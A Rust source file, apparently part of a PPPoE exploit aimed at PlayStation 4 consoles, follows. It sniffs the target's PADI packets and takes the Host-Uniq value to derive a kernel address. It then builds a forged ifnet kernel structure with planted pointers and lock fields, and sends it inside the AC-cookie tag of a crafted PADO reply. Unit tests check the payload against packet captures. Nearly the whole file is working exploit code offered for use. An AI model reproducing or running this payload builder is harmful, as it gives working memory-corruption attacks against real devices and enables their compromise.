extern crate pnet;
use crate::constants;
use pnet::datalink::Channel::Ethernet;
use pnet::datalink::{self, DataLinkReceiver, DataLinkSender, NetworkInterface};
use pnet::packet::ethernet::{EthernetPacket, MutableEthernetPacket};
use pnet::packet::{MutablePacket, Packet};

pub struct Exploit {
    pub target_mac: [u8; 6],
    pub pppoe_softc: u64,
    pub source_mac: [u8; 6],
    pub host_uniq: [u8; 8],
}

impl Exploit {
    pub fn calc_planted(&mut self) {
        let planted = (self.pppoe_softc + 0x07) & 0xffffffffffff;
        let planted_bytes = planted.to_be_bytes();
        // Take the first 6 bytes of the 8-byte array and convert them to a fixed-size array
        let truncated_bytes: [u8; 6] = planted_bytes[2..8]
            .try_into()
            .expect("slice with incorrect length");
        self.source_mac = truncated_bytes;
        println!("[+] Source MAC: {:?}", self.source_mac);
    }

    pub fn ppp_negotiation(&mut self, interface: NetworkInterface) {
        println!("[*] Starting PPP Negotiation...");
        let (mut tx, mut rx) = match datalink::channel(&interface, Default::default()) {
            Ok(Ethernet(tx, rx)) => (tx, rx),
            Ok(_) => panic!("Unhandled channel type"),
            Err(e) => panic!(
                "An error occurred when creating the datalink channel: {}",
                e
            ),
        };
        // Captures the padi
        loop {
            match rx.next() {
                Ok(packet) => {
                    if !is_padi_packet(packet) {
                        continue;
                    }
                    print!("Found PADI {:?}", packet);
                    self.handle_padi(packet);
                    // Create the PADO
                    let pado = create_pado_packet(
                        self.source_mac,
                        self.target_mac,
                        build_fake_ifnet(self.pppoe_softc),
                        self.host_uniq,
                    );
                    // Send the pado
                    let result = tx.send_to(&pado, None).expect("Failed to send PADO packet");
                    // Start monitoring again for packet to look for the padr
                }
                Err(e) => {
                    // If an error occurs, w e can handle it here
                    panic!("An error occurred while reading a packet : {}", e);
                }
            }
        }
    }

    pub fn handle_padi(&mut self, data: &[u8]) {
        println!("[+] PADI packet received");
        // Extracting Host Unique Tag and populating the self.pppoe_softc
        self.host_uniq = extract_host_uniq(&data).unwrap();
        self.pppoe_softc = u64::from_be_bytes(self.host_uniq);
        // Extract and update source mac
        self.target_mac = extract_ps4_source_mac(&data).unwrap();
        println!("[+] Exploit Target MAC: {:?}", self.target_mac);
        self.calc_planted();
        let ac_cookie = build_fake_ifnet(self.pppoe_softc);
        println!("[+] AC cookie length: {:?}", ac_cookie.len());
    }
}

fn is_padi_packet(data: &[u8]) -> bool {
    // Check if packet length is sufficient for PPPoE Discovery header
    if data.len() < 14 + 6 {
        return false;
    }

    // Check Ethernet type field for PPPoE Discovery (0x8863)
    let ethertype = u16::from_be_bytes([data[12], data[13]]);
    if ethertype != constants::ETHERTYPE_PPPOEDISC {
        return false;
    }

    // Check PPPoE code field for PADI (0x09)
    let pppoe_code = u8::from_be_bytes([data[15]]);
    pppoe_code == constants::PPPOE_CODE_PADI
}

fn extract_host_uniq(data: &[u8]) -> Result<[u8; 8], Box<dyn std::error::Error>> {
    let mut result = [0u8; 8];
    // Go to the tags
    let mut offset = constants::ETH_HEADER_LEN + constants::PPPOE_HEADER_LEN;
    // Read all the tags until possible
    while offset + constants::PPPOE_TAG_HEADER_LEN <= data.len() {
        // Read Header
        let tag_type = u16::from_be_bytes([data[offset], data[offset + 1]]);
        let tag_len = u16::from_be_bytes([data[offset + 2], data[offset + 3]]) as usize;
        offset += constants::PPPOE_TAG_HEADER_LEN;
        if tag_type == constants::PPPOE_TAG_HOST_UNIQ {
            if offset + tag_len <= data.len() {
                // Extract the Host-Uniq tag value
                let host_uniq = &data[offset..offset + tag_len];
                if tag_len == 8 {
                    // If Host-Uniq is expected to be a 64-bit integer, interpret it as Big-Endian
                    result.copy_from_slice(host_uniq);
                    println!("[+] Extracted Host-Uniq: {:?}", result);
                    break;
                }
            }
        }
        // Go to next tag
        offset += tag_len;
    }
    Ok(result)
}

fn extract_ps4_source_mac(data: &[u8]) -> Result<[u8; 6], Box<dyn std::error::Error>> {
    // Extract the source MAC address
    let offset = constants::ETH_SOURCE_MAC;
    let mac_bytes = &data[offset..offset + 6];

    // Create a 6-byte array and copy the data into it
    let mut mac_address = [0u8; 6];
    mac_address.copy_from_slice(mac_bytes);

    Ok(mac_address)
}

pub fn build_fake_ifnet(pppoe_softc: u64) -> Vec<u8> {
    // Fake ifnet
    let mut fake_ifnet = vec![0x41; 0x48]; // Fill with 'A' initially
    fake_ifnet.extend(&constants::ZERO.to_le_bytes()); // if_addrhead
    fake_ifnet.resize(0x70, 0x41); // Fill to 0x70 with 'A'
    fake_ifnet.extend(&0x0001u16.to_le_bytes()); // if_index
    fake_ifnet.resize(0xa0, 0x41); // Fill to 0xa0 with 'A'
    fake_ifnet.push(constants::IFT_ETHER); // ifi_type
    fake_ifnet.push(0); // ifi_physical
    fake_ifnet.push(0x8 + 0x1); // ifi_addrlen
    fake_ifnet.resize(0x1b8, 0x41); // Fill to 0x1b8 with 'A'

    fake_ifnet.extend(&(pppoe_softc + constants::PPPOE_SOFTC_SC_DEST).to_le_bytes()); // if_addr
    fake_ifnet.resize(0x428, 0x41); // Fill to 0x428 with 'A'
    fake_ifnet.extend(&(pppoe_softc + 0x10 - 0x8).to_le_bytes()); // nd_ifinfo
                                                                  // if_afdata_lock

    fake_ifnet.resize(0x480, 0x41); // Fill to 0x480 with 'A'
    fake_ifnet.extend(&constants::ZERO.to_le_bytes()); // lo_name
    fake_ifnet.extend(&constants::RW_INIT_FLAGS.to_le_bytes()); // lo_flags
    fake_ifnet.extend(&0u32.to_le_bytes()); // lo_data
    fake_ifnet.extend(&constants::ZERO.to_le_bytes()); // lo_witness
    fake_ifnet.extend(&constants::RW_UNLOCKED.to_le_bytes()); // rw_lock
                                                              // if_addr_mtx

    fake_ifnet.resize(0x4c0, 0x41); // Fill to 0x4c0 with 'A'

    fake_ifnet.extend(&constants::ZERO.to_le_bytes()); // lo_name
    fake_ifnet.extend(&constants::MTX_INIT_FLAGS.to_le_bytes()); // lo_flags
    fake_ifnet.extend(&0u32.to_le_bytes()); // lo_data
    fake_ifnet.extend(&constants::ZERO.to_le_bytes()); // lo_witness
    fake_ifnet.extend(&constants::MTX_UNOWNED.to_le_bytes()); // mtx_lock
    fake_ifnet
}

pub fn create_pado_packet(
    source_mac: [u8; 6],
    target_mac: [u8; 6],
    ac_cookie: Vec<u8>,
    host_uniq: [u8; 8],
) -> Vec<u8> {
    let mut packet = Vec::new();

    // Ethernet header
    packet.extend_from_slice(&target_mac);
    packet.extend_from_slice(&source_mac);
    packet.extend_from_slice(&constants::ETHERTYPE_PPPOEDISC.to_be_bytes());

    // PPPoE header
    packet.push(0x11); // Version (1) and Type (1)
    packet.push(constants::PPPOE_CODE_PADO); // Code (PADO)
    packet.extend_from_slice(&0u16.to_be_bytes()); // Session ID (not used in PADO)

    // Placeholder for Payload Length (2 bytes), will be set later
    let payload_length_pos = packet.len();
    packet.extend_from_slice(&[0, 0]);

    // PPPoE Tag for ACOOKIE
    packet.extend_from_slice(&constants::PPPOE_TAG_ACOOKIE.to_be_bytes());
    packet.extend_from_slice(&(ac_cookie.len() as u16).to_be_bytes());
    packet.extend_from_slice(&ac_cookie);

    // PPPoE Tag for HUNIQUE
    packet.extend_from_slice(&constants::PPPOE_TAG_HOST_UNIQ.to_be_bytes());
    packet.extend_from_slice(&(host_uniq.len() as u16).to_be_bytes());
    packet.extend_from_slice(&host_uniq);

    // Set the Payload Length
    let payload_length = packet.len() - payload_length_pos - 2;
    packet[payload_length_pos..payload_length_pos + 2]
        .copy_from_slice(&(payload_length as u16).to_be_bytes());

    packet
}

fn listen_for_packet<F>(rx: &mut dyn DataLinkReceiver, predicate: F) -> Option<Vec<u8>>
where
    F: Fn(&[u8]) -> bool,
{
    loop {
        match rx.next() {
            Ok(packet) => {
                if predicate(&packet) {
                    // Get the raw packet data as a slice
                    return Some(packet.to_vec());
                }
            }
            Err(e) => {
                panic!("An error occurred while reading a packet: {}", e);
            }
        }
    }
}

mod tests {
    use super::*;
    use pcap::{Activated, Active, Capture, Inactive, State};
    use pcap::{Offline, Packet};

    #[test]
    fn test_is_padi_packet_from_file() {
        // Open the pcap file
        let mut cap =
            Capture::from_file("initial_two_padi.pcap").expect("Failed to open pcap file");
        let mut count = 0;
        while let Ok(packet) = cap.next_packet() {
            if is_padi_packet(&packet) {
                println!("Found a PADI packet: {:?}", packet);
                count += 1;
            }
        }

        // Assert that 2 PADI packet were found
        assert_eq!(count, 2);
    }
    #[test]
    fn test_extract_host_uniq() {
        // Open the pcap file
        let mut cap =
            Capture::from_file("initial_two_padi.pcap").expect("Failed to open pcap file");

        while let Ok(packet) = cap.next_packet() {
            if is_padi_packet(&packet) {
                match extract_host_uniq(&packet) {
                    Ok(host_uniq) => {
                        println!("Extracted Host-Uniq: {:?}", host_uniq);
                        println!("Extracted Host-Uniq: {:?}", u64::from_be_bytes(host_uniq));
                        // Print the value as hexadecimal
                        println!(
                            "Converted value in hex: 0x{:016x}",
                            u64::from_be_bytes(host_uniq)
                        );

                        // Assert that the Host-Uniq value has the expected length
                        assert_eq!(host_uniq.len(), 8);
                        assert_eq!(u64::from_be_bytes(host_uniq), 0x002cf606ba9bffff)
                    }
                    Err(e) => {
                        panic!("Failed to extract Host-Uniq: {:?}", e);
                    }
                }
            }
        }
    }

    #[test]
    fn test_extract_source_mac() {
        // Open the pcap file
        let mut cap =
            Capture::from_file("initial_two_padi.pcap").expect("Failed to open pcap file");

        while let Ok(packet) = cap.next_packet() {
            if is_padi_packet(&packet) {
                match extract_ps4_source_mac(&packet) {
                    Ok(source_mac) => {
                        println!("Extracted Source MAC Address: {:?}", source_mac);
                        // Assert that the MAC address has the expected length
                        assert_eq!(source_mac.len(), 6);
                        // Optionally, check the MAC address values
                        assert_eq!(&source_mac, &[0xc8, 0x63, 0xf1, 0x44, 0x45, 0x97]);
                    }
                    Err(e) => {
                        panic!("Failed to extract Source MAC Address: {:?}", e);
                    }
                }
            }
        }
    }

    use std::fs::File;
    use std::io::Read;
    use std::io::Write;
    #[test]
    fn test_fake_ifnet_comparison() {
        // Generate fake ifnet using the Rust implementation
        let pppoe_softc: u64 = 0x123456789ABCDEF0;
        let rust_fake_ifnet = build_fake_ifnet(pppoe_softc);

        // Dump the fake ifnet to a file
        let mut rust_file = File::create("rust_fake_ifnet.bin").expect("Failed to create file");
        rust_file
            .write_all(&rust_fake_ifnet)
            .expect("Failed to write to file");

        // Load the fake ifnet generated by Python
        let mut python_fake_ifnet = Vec::new();
        let mut python_file =
            File::open("fake_ifnet.bin").expect("Failed to open Python fake ifnet file");
        python_file
            .read_to_end(&mut python_fake_ifnet)
            .expect("Failed to read Python fake ifnet file");

        // Compare the lengths of the two files
        assert_eq!(
            rust_fake_ifnet.len(),
            python_fake_ifnet.len(),
            "File lengths are not equal"
        );

        // Compare the contents of the two files byte by byte
        for (idx, (rust_byte, python_byte)) in rust_fake_ifnet
            .iter()
            .zip(python_fake_ifnet.iter())
            .enumerate()
        {
            assert_eq!(rust_byte, python_byte, "Byte mismatch at index {}", idx);
        }
    }

    #[test]
    fn test_pado_packet() {
        // Open the pcap file containing the expected PADO packet
        let mut cap = Capture::from_file("pado_to_ps4.pcap").expect("Failed to open pcap file");

        // Extract the PADO packet from the file
        let expected_packet = cap.next_packet().expect("Failed to read PADO packet");

        // Define the input parameters for creating the PADO packet
        let source_mac = [0x07, 0x2c, 0xf6, 0x06, 0xba, 0x9b];
        let target_mac = [0xc8, 0x63, 0xf1, 0x44, 0x45, 0x97];
        let ifnet = build_fake_ifnet(0xffff9bba06f62c00);
        let ac_cookie = ifnet;
        let host_uniq = [0x00, 0x2c, 0xf6, 0x06, 0xba, 0x9b, 0xff, 0xff];

        // Create the PADO packet using the provided function
        let generated_pado_packet =
            create_pado_packet(source_mac, target_mac, ac_cookie, host_uniq);

        // Write the generated PADO packet to a binary file
        let mut generated_file =
            File::create("generated_pado.bin").expect("Failed to create binary file");
        generated_file
            .write_all(&generated_pado_packet)
            .expect("Failed to write packet to binary file");

        // Write the expected PADO packet to a binary file
        let mut expected_file =
            File::create("expected_pado.bin").expect("Failed to create binary file");
        expected_file
            .write_all(&expected_packet.data)
            .expect("Failed to write packet to binary file");

        // Compare the lengths of the expected and generated packets
        assert_eq!(
            expected_packet.data.len(),
            generated_pado_packet.len(),
            "Packet lengths are not equal"
        );

        // Compare the contents of the expected and generated packets byte by byte
        for (idx, (expected_byte, generated_byte)) in expected_packet
            .data
            .iter()
            .zip(generated_pado_packet.iter())
            .enumerate()
        {
            assert_eq!(
                expected_byte, generated_byte,
                "Byte mismatch at index {}: expected {:02x}, got {:02x}",
                idx, expected_byte, generated_byte
            );
        }
    }
}
